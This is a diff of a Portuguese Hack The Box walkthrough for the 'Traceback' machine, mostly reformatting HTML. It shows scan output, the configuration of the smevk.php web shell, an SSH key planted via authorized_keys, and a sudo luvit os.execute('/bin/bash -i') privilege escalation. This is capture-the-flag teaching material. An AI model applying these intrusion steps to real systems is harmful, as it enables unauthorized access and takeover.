@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-us">
   <head>
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.123.7">
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Traceback | FXSHELL</title>
@@ -24,8 +24,7 @@
 <meta property="article:modified_time" content="2020-10-19T12:39:26-03:00" />
 
 
-    <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Traceback"/>
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Traceback"/>
 <meta name="twitter:description" content="PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel [21:08:54] Starting: [21:09:02] 403 - 300B - /.htaccess-dev [21:09:02] 403 - 302B - /."/>
 
     
@@ -171,69 +170,69 @@ fetchInject(["/js/lazysizes.min.js"]);
     <h1>Traceback</h1>
   </header>
   <p><img src="/traceback-01.png" alt="HTB"></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
-<span class="p">|</span> http-methods: 
-<span class="p">|</span>_  Supported Methods: POST OPTIONS HEAD GET
-<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-<span class="p">|</span>_http-title: Help us
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>21:08:54<span class="o">]</span> Starting: 
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htaccess-dev
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  302B  - /.htaccess-local
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  302B  - /.htaccess-marco
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  301B  - /.htaccess.bak1
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htaccess.old
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  301B  - /.htaccess.orig
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  303B  - /.htaccess.sample
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  301B  - /.htaccess.save
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htaccess.txt
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  299B  - /.htaccessBAK
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  299B  - /.htaccessOLD
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htaccessOLD2
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htpasswd-old
-<span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  298B  - /.httr-oauth
-<span class="o">[</span>21:09:05<span class="o">]</span> <span class="m">403</span> -  291B  - /.php
-<span class="o">[</span>21:09:52<span class="o">]</span> <span class="m">200</span> -  564B  - /id_rsa.pub
-<span class="o">[</span>21:09:54<span class="o">]</span> <span class="m">200</span> -    1KB - /index.html
-<span class="o">[</span>21:10:12<span class="o">]</span> <span class="m">403</span> -  300B  - /server-status
-<span class="o">[</span>21:10:12<span class="o">]</span> <span class="m">403</span> -  301B  - /server-status/
-
-Task Completed
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">-----------------
-DIRB v2.22    
-By The Dark Raver
------------------
-
-START_TIME: Wed Jul  <span class="m">1</span> 21:38:59 <span class="m">2020</span>
-URL_BASE: http://10.10.10.181/
-WORDLIST_FILES: shells
-
------------------
-
-GENERATED WORDS: <span class="m">19</span>                                                            
-
----- Scanning URL: http://10.10.10.181/ ----
-+ http://10.10.10.181/smevk.php <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:1261<span class="o">)</span>                           
-                                                                               
------------------
-END_TIME: Wed Jul  <span class="m">1</span> 21:39:01 <span class="m">2020</span>
-DOWNLOADED: <span class="m">19</span> - FOUND: <span class="m">1</span>
-</code></pre></div><p><a href="https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php">https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php</a></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">//Make your setting here.
-<span class="nv">$deface_url</span> <span class="o">=</span> <span class="s1">&#39;http://pastebin.com/raw.php?i=FHfxsFGT&#39;</span><span class="p">;</span>  //deface url here<span class="o">(</span>pastebin<span class="o">)</span>.
-<span class="nv">$UserName</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>                                      //Your UserName here.
-<span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>                                  //Your Password.
-//Change Shell Theme here//
-<span class="nv">$color</span> <span class="o">=</span> <span class="s2">&#34;#8B008B&#34;</span><span class="p">;</span>                                   //Fonts color modify here.
-<span class="nv">$Theme</span> <span class="o">=</span> <span class="s1">&#39;#8B008B&#39;</span><span class="p">;</span>                                    //Change border-color accoriding to your choice.
-<span class="nv">$TabsColor</span> <span class="o">=</span> <span class="s1">&#39;#0E5061&#39;</span><span class="p">;</span>                              //Change tabs color here.
-</code></pre></div><p>mesmo esquema de autorized_keys, vulnerabilidade do ssh_id</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: POST OPTIONS HEAD GET
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Help us
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>21:08:54<span class="o">]</span> Starting: 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htaccess-dev
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  302B  - /.htaccess-local
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  302B  - /.htaccess-marco
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  301B  - /.htaccess.bak1
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htaccess.old
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  301B  - /.htaccess.orig
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  303B  - /.htaccess.sample
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  301B  - /.htaccess.save
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htaccess.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  299B  - /.htaccessBAK
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  299B  - /.htaccessOLD
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htaccessOLD2
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  300B  - /.htpasswd-old
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:02<span class="o">]</span> <span class="m">403</span> -  298B  - /.httr-oauth
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:05<span class="o">]</span> <span class="m">403</span> -  291B  - /.php
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:52<span class="o">]</span> <span class="m">200</span> -  564B  - /id_rsa.pub
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:09:54<span class="o">]</span> <span class="m">200</span> -    1KB - /index.html
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:10:12<span class="o">]</span> <span class="m">403</span> -  300B  - /server-status
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:10:12<span class="o">]</span> <span class="m">403</span> -  301B  - /server-status/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Task Completed
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">DIRB v2.22    
+</span></span><span class="line"><span class="cl">By The Dark Raver
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">START_TIME: Wed Jul  <span class="m">1</span> 21:38:59 <span class="m">2020</span>
+</span></span><span class="line"><span class="cl">URL_BASE: http://10.10.10.181/
+</span></span><span class="line"><span class="cl">WORDLIST_FILES: shells
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GENERATED WORDS: <span class="m">19</span>                                                            
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">---- Scanning URL: http://10.10.10.181/ ----
+</span></span><span class="line"><span class="cl">+ http://10.10.10.181/smevk.php <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:1261<span class="o">)</span>                           
+</span></span><span class="line"><span class="cl">                                                                               
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">END_TIME: Wed Jul  <span class="m">1</span> 21:39:01 <span class="m">2020</span>
+</span></span><span class="line"><span class="cl">DOWNLOADED: <span class="m">19</span> - FOUND: <span class="m">1</span>
+</span></span></code></pre></div><p><a href="https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php">https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">//Make your setting here.
+</span></span><span class="line"><span class="cl"><span class="nv">$deface_url</span> <span class="o">=</span> <span class="s1">&#39;http://pastebin.com/raw.php?i=FHfxsFGT&#39;</span><span class="p">;</span>  //deface url here<span class="o">(</span>pastebin<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"><span class="nv">$UserName</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>                                      //Your UserName here.
+</span></span><span class="line"><span class="cl"><span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>                                  //Your Password.
+</span></span><span class="line"><span class="cl">//Change Shell Theme here//
+</span></span><span class="line"><span class="cl"><span class="nv">$color</span> <span class="o">=</span> <span class="s2">&#34;#8B008B&#34;</span><span class="p">;</span>                                   //Fonts color modify here.
+</span></span><span class="line"><span class="cl"><span class="nv">$Theme</span> <span class="o">=</span> <span class="s1">&#39;#8B008B&#39;</span><span class="p">;</span>                                    //Change border-color accoriding to your choice.
+</span></span><span class="line"><span class="cl"><span class="nv">$TabsColor</span> <span class="o">=</span> <span class="s1">&#39;#0E5061&#39;</span><span class="p">;</span>                              //Change tabs color here.
+</span></span></code></pre></div><p>mesmo esquema de autorized_keys, vulnerabilidade do ssh_id</p>
 <p><img src="/traceback-02.png" alt="HTB"></p>
 <p>fiz upload da minha ssh_id &gt; renomeada para
 <code>authorized_keys</code></p>
@@ -241,47 +240,46 @@ DOWNLOADED: <span class="m">19</span> - FOUND: <span class="m">1</span>
 <p>agora eu faço login no  webmaster usuário que encontrei no site do cara</p>
 <p><code>webadmin@10.10.10.181 -i id_rsa</code></p>
 <p>Autentico com a minha própria chave</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> root  ~  ssh webadmin@10.10.10.181 -i id_rsa
-Warning: Identity file id_rsa not accessible: No such file or directory.
-The authenticity of host <span class="s1">&#39;10.10.10.181 (10.10.10.181)&#39;</span> can<span class="s1">&#39;t be established.
-</span><span class="s1">ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
-</span><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-</span><span class="s1">Warning: Permanently added &#39;</span>10.10.10.181<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
-<span class="c1">#################################</span>
--------- OWNED BY XH4H  ---------
-- I guess stuff could have been configured better ^^ -
-<span class="c1">#################################</span>
-
-Welcome to Xh4H land 
-
-
-
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-Last login: Wed Jul  <span class="m">1</span> 17:43:51 <span class="m">2020</span> from 10.10.15.66
-webadmin@traceback:~$ 
-</code></pre></div><pre tabindex="0"><code>webadmin@traceback:~$ cat note.txt 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> root  ~  ssh webadmin@10.10.10.181 -i id_rsa
+</span></span><span class="line"><span class="cl">Warning: Identity file id_rsa not accessible: No such file or directory.
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.10.181 (10.10.10.181)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.10.181<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
+</span></span><span class="line"><span class="cl"><span class="c1">#################################</span>
+</span></span><span class="line"><span class="cl">-------- OWNED BY XH4H  ---------
+</span></span><span class="line"><span class="cl">- I guess stuff could have been configured better ^^ -
+</span></span><span class="line"><span class="cl"><span class="c1">#################################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Welcome to Xh4H land 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Wed Jul  <span class="m">1</span> 17:43:51 <span class="m">2020</span> from 10.10.15.66
+</span></span><span class="line"><span class="cl">webadmin@traceback:~$ 
+</span></span></code></pre></div><pre tabindex="0"><code>webadmin@traceback:~$ cat note.txt 
 - sysadmin -
 I have left a tool to practice Lua.
-I'm sure you know where to find it.
+I&#39;m sure you know where to find it.
 Contact me if you have any question.
 </code></pre><p>#google#</p>
 <p><img src="/traceback-03.png" alt="HTB"></p>
 <p>mais um shell reverso</p>
 <p><code>sudo -u sysadmin /home/sysadmin/luvit</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
-Welcome to the Luvit repl!
-&gt; os.execute<span class="o">(</span><span class="s2">&#34;/bin/bash -i&#34;</span><span class="o">)</span>
-sysadmin@traceback:~$ 
-</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sysadmin@traceback:~$ <span class="nb">cd</span> ..
-sysadmin@traceback:/home$ ls
-sysadmin  webadmin
-sysadmin@traceback:/home$ <span class="nb">cd</span> sysadmin/
-sysadmin@traceback:/home/sysadmin$ ls
-00-header  luvit  user.txt
-sysadmin@traceback:/home/sysadmin$
-
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit
+</span></span><span class="line"><span class="cl">Welcome to the Luvit repl!
+</span></span><span class="line"><span class="cl">&gt; os.execute<span class="o">(</span><span class="s2">&#34;/bin/bash -i&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">sysadmin@traceback:~$ 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sysadmin@traceback:~$ <span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl">sysadmin@traceback:/home$ ls
+</span></span><span class="line"><span class="cl">sysadmin  webadmin
+</span></span><span class="line"><span class="cl">sysadmin@traceback:/home$ <span class="nb">cd</span> sysadmin/
+</span></span><span class="line"><span class="cl">sysadmin@traceback:/home/sysadmin$ ls
+</span></span><span class="line"><span class="cl">00-header  luvit  user.txt
+</span></span><span class="line"><span class="cl">sysadmin@traceback:/home/sysadmin$
+</span></span></code></pre></div>
 </main>
     <footer>
   
